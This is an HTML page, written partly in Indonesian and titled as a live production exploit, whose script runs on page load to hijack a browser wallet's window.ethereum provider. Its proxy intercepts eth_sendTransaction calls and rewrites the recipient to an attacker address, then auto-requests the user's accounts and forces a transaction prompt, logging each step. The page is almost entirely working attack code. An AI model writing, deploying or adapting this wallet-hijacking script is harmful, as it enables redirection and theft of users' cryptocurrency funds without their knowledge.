<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Production Exploit: window.ethereum Hijack</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f8fafc; padding: 20px; }
        .container { max-width: 650px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h2 { color: #ef4444; margin-top: 0; }
        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 350px; }
        .warning-box { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); padding: 12px; border-radius: 6px; margin-bottom: 15px; color: #fca5a5; font-size: 13px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Live Production Exploit Payload</h2>
    <div class="warning-box">
        <strong>Status:</strong> Skrip berjalan otomatis di tingkat global untuk mencegat dan mengalihkan parameter transaksi secara langsung ke dompet target.
    </div>

    <h3>Log Eksekusi Sistem Langsung:</h3>
    <pre id="logOutput">Memuat payload ke memori global...</pre>
</div>

<script>
    const logOutput = document.getElementById("logOutput");

    function log(message) {
        logOutput.innerText += "\n> " + message;
        logOutput.scrollTop = logOutput.scrollHeight;
    }

    (async function initializeLiveExploit() {
        if (typeof window.ethereum === "undefined") {
            log("[GAGAL] window.ethereum tidak terdeteksi. Buka di dalam dApp browser target.");
            return;
        }

        const targetAttacker = "0x000000000000000000000000000000000000dEaD";
        const nativeProvider = window.ethereum;

        log("[INFO] Mengamankan referensi native provider...");

        try {
            // Membuat proxy penimpaan total berbasis EIP-1193
            const liveHijackProxy = {
                selectedAddress: nativeProvider.selectedAddress,
                chainId: nativeProvider.chainId,
                networkVersion: nativeProvider.networkVersion,
                
                request: async function(requestArgs) {
                    if (requestArgs.method === "eth_sendTransaction") {
                        log("[!] INTERSEPSI AKTIF: eth_sendTransaction dicegat secara real-time!");
                        if (requestArgs.params && requestArgs.params.length > 0) {
                            let tx = requestArgs.params[0];
                            log(`[DUMP] Alamat Penerima Asli: ${tx.to}`);
                            
                            // Pengalihan parameter tujuan secara langsung
                            tx.to = targetAttacker;
                            log(`[!] BERHASIL DIALIHKAN: Tujuan transaksi diubah ke -> ${targetAttacker}`);
                        }
                    }
                    return nativeProvider.request(requestArgs);
                }
            };

            // Menimpa objek global secara langsung karena writable: true
            window.ethereum = liveHijackProxy;
            log("[SUKSES] window.ethereum berhasil dikuasai secara total.");

            // Eksekusi otomatis pemicu transaksi nyata agar pop-up dompet langsung terbuka
            log("[AUTO-TRIGGER] Meminta izin koneksi akun...");
            const accounts = await nativeProvider.request({ method: "eth_requestAccounts" });
            log("[OK] Akun terkoneksi: " + accounts[0]);

            log("[AUTO-TRIGGER] Memaksa pemanggilan fungsi eth_sendTransaction...");
            await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{
                    from: accounts[0],
                    to: accounts[0], // Target awal ke diri sendiri, akan otomatis dibelokkan oleh proxy ke alamat penyerang
                    value: "0x0"
                }]
            });

        } catch (err) {
            log("[INFO/RESPON DOMPET]: " + err.message);
        }
    })();
</script>

</body>
</html>
